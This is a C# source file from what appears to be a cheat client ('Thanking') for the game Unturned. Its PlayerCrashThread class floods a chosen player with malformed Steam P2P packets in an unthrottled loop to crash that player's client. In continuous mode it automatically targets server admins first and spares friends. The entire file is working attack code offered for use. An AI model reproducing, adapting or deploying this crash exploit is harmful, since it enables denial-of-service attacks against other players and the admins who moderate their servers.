﻿using System;
 using System.Collections.Generic;
 using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Overrides;
 using Thanking.Utilities;
 using Thanking.Variables;
 using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool ContinuousPlayerCrash;
        public static List<CSteamID> CrashTargets = new List<CSteamID>();
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif

            byte[] P1 = {(byte)ESteamPacket.UPDATE_RELIABLE_INSTANT, 0, 0};
            
            while (true)
                if (CrashTarget != CSteamID.Nil)
                    SteamNetworking.SendP2PPacket(CrashTarget, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                else
                    Thread.Sleep(500);
        }

        [Thread]
        public static void CheckThread()
        {
            while (true)
            {
                if (Provider.clients.All(p => CrashTarget != p.playerID.steamID))
                {
                    if (ContinuousPlayerCrash && Provider.clients.Count > 1)
                    {
                        CSteamID? sid = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                            .FirstOrDefault(p =>
                                p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player))
                            ?.playerID
                            .steamID;

                        if (sid.HasValue)
                            CrashTarget = sid.Value;
                    }
                    else
                        CrashTarget = CrashTargets.Count > 0 ? CrashTargets.First(c => Provider.clients.Any(p => p.playerID.steamID == c)) : CSteamID.Nil;
                }

                Thread.Sleep(500);
            }
        }  
    }
}
